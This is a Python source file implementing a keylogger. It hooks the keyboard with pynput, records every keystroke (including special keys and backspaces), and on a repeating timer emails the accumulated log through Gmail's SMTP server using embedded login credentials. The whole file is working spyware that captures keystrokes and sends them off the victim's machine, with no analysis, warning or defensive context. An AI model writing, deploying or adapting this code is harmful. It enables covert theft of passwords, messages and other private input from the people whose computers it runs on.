import pynput.keyboard, threading, smtplib

class Keylog:
    
    def __init__(self, interval_time, email, password) :
        self.log = ""
        self.interval = interval_time
        self.email = email
        self.password = password
        
    def append_to_key(self, string):
        self.log = self.log + string
        

    def process_key_strike(self,key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.backspace:
                current_key = " [Backspace] "
            else:
                current_key = " [" + str(key) + "] "
        self.append_to_key(current_key)
        
    def report(self):
        self.send_mail(self.email, self.password ,"\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    def send_mail(self, email, password , message):   
        server = smtplib.SMTP("smtp.gmail.com" , 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message) 
        server.quit()
        
    def start(self): 
        keyboard_listener = pynput.keyboard.Listener(on_press = self.process_key_strike)
        keyboard_listener.start()
        self.report()
        keyboard_listener.join()